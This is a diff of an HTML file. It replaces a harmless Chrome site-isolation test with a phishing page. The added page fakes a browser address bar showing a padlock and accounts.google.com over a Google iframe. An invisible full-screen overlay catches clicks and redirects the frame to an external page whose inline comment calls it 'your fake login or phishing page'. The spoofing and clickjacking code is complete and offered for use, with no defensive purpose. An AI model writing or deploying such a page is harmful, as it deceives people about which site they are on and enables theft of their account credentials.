@@ -1,19 +1,53 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>Testing Site Isolation in Chrome Android</h3>
-    <iframe src="https://example.com" sandbox="allow-scripts allow-same-origin" style="width:100%; height:300px;"></iframe>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Secure Login</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      font-family: sans-serif;
+    }
+    .fake-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #f2f2f2;
+      padding: 8px;
+      font-size: 14px;
+      border-bottom: 1px solid #ccc;
+      z-index: 9999;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      margin-top: 30px;
+    }
+    .clickcatch {
+      position: absolute;
+      top: 40%;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 10000;
+    }
+  </style>
+</head>
+<body>
+  <div class="fake-bar">🔒 https://accounts.google.com</div>
+  <iframe id="mainFrame" src="https://www.google.com"></iframe>
 
-    <script>
-      setTimeout(() => {
-        try {
-          const iframe = document.querySelector("iframe");
-          const secret = iframe.contentWindow.document.body.innerText;
-          alert("Leak: " + secret); // Should not happen
-        } catch (e) {
-          alert("Blocked (Isolation working): " + e.message);
-        }
-      }, 3000);
-    </script>
-  </body>
+  <div class="clickcatch" onclick="triggerSpoof()"></div>
+
+  <script>
+    function triggerSpoof() {
+      const iframe = document.getElementById("mainFrame");
+      iframe.src = "https://mrnoob790.github.io/fake-login.html"; // your fake login or phishing page
+    }
+  </script>
+</body>
 </html>
